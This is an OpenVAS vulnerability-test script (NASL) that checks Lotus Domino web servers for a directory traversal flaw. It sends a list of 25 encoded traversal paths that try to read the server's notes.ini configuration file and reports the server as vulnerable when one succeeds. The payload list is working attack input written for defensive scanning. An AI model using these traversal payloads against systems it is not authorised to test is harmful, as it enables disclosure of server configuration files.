# OpenVAS Vulnerability Test
# $Id: notesinicheck.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: notes.ini checker
#
# Authors:
# Hemil Shah
#
# Copyright:
# Copyright (C) 2000 - 2004 Net-Square Solutions Pvt Ltd.
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "This plugin attempts to determine the existence of a directory traversal 
bug on the remote Lotus Domino Web server";

# Desc: This script will check for the notes.ini file in the remote web server.

if(description)
{
        script_oid("1.3.6.1.4.1.25623.1.0.12248");
        script_version("$Revision: 9348 $");
        script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
        script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
        script_tag(name:"cvss_base", value:"5.0");
        script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
        name = "notes.ini checker";
        script_name(name);


        summary = "notes.ini checker";
        script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_active");
        script_copyright("This script is Copyright (C) 2004 Net-Square Solutions Pvt Ltd.");
        family = "Web application abuses";
        script_family(family);
        script_dependencies("gb_get_http_banner.nasl");
        script_mandatory_keys("Domino/banner");
        script_require_ports("Services/www", 80);
        script_tag(name : "summary" , value : tag_summary);
        exit(0);
}



# start script

include("http_func.inc");
include("http_keepalive.inc");



port = get_http_port(default:80);

if(! get_port_state(port))
    exit(0);

if ( get_kb_item("www/no404/" + port ) ) exit(0);

banner = get_http_banner(port:port);
if ( "Domino" >!< banner ) exit(0);

DEBUG = 0;

req = http_get(item:"../../../../whatever.ini", port:port); 
res = http_keepalive_send_recv(port:port, data:req);
if ( res == NULL ) exit(0);

if (ereg(pattern:"^HTTP/[01]\.[01] 200 ", string:res)  ) exit (0);

dirs[0] = "/%00%00.nsf/../lotus/domino/notes.ini";
dirs[1] = "/%00%20.nsf/../lotus/domino/notes.ini";
dirs[2] = "/%00%c0%af.nsf/../lotus/domino/notes.ini";
dirs[3] = "/%00...nsf/../lotus/domino/notes.ini";
dirs[4] = "/%00.nsf//../lotus/domino/notes.ini";
dirs[5] = "/%00.nsf/../lotus/domino/notes.ini";
dirs[6] = "/%00.nsf/..//lotus/domino/notes.ini";
dirs[7] = "/%00.nsf/../../lotus/domino/notes.ini";
dirs[8] = "/%00.nsf.nsf/../lotus/domino/notes.ini";
dirs[9] = "/%20%00.nsf/../lotus/domino/notes.ini";
dirs[10] = "/%20.nsf//../lotus/domino/notes.ini";
dirs[11] = "/%20.nsf/..//lotus/domino/notes.ini";
dirs[12] = "/%c0%af%00.nsf/../lotus/domino/notes.ini";
dirs[13] = "/%c0%af.nsf//../lotus/domino/notes.ini";
dirs[14] = "/%c0%af.nsf/..//lotus/domino/notes.ini";
dirs[15] = "/...nsf//../lotus/domino/notes.ini";
dirs[16] = "/...nsf/..//lotus/domino/notes.ini";
dirs[17] = "/.nsf///../lotus/domino/notes.ini";
dirs[18] = "/.nsf//../lotus/domino/notes.ini";
dirs[19] = "/.nsf//..//lotus/domino/notes.ini";
dirs[20] = "/.nsf/../lotus/domino/notes.ini";
dirs[21] = "/.nsf/../lotus/domino/notes.ini";
dirs[22] = "/.nsf/..///lotus/domino/notes.ini";
dirs[23] = "/.nsf%00.nsf/../lotus/domino/notes.ini";
dirs[24] = "/.nsf.nsf//../lotus/domino/notes.ini";

report = string("The Lotus Domino Web server is vulnerable to a directory-traversal attack\n");


for (i=0; dirs[i]; i++)
{  
	req = http_get(item:dirs[i], port:port); 
	res = http_keepalive_send_recv(port:port, data:req);
	if ( res == NULL ) exit(0);

       
        if(ereg(pattern:"^HTTP/[01]\.[01] 200 ", string:res)  )
        {
	    if ("DEBUG" >< res)
	    {
	    	report = report + string("specifically, the request for ", dirs[i], " appears\n");
            	report = report + string("to have retrieved the notes.ini file.  See also:\n");
	    	report = report + string("http://www.securityfocus.com/archive/101/155904/2001-01-08/2001-01-14/0\n");
            	security_message(port:port, data:report);            
            	exit(0);
	    }
        }
}
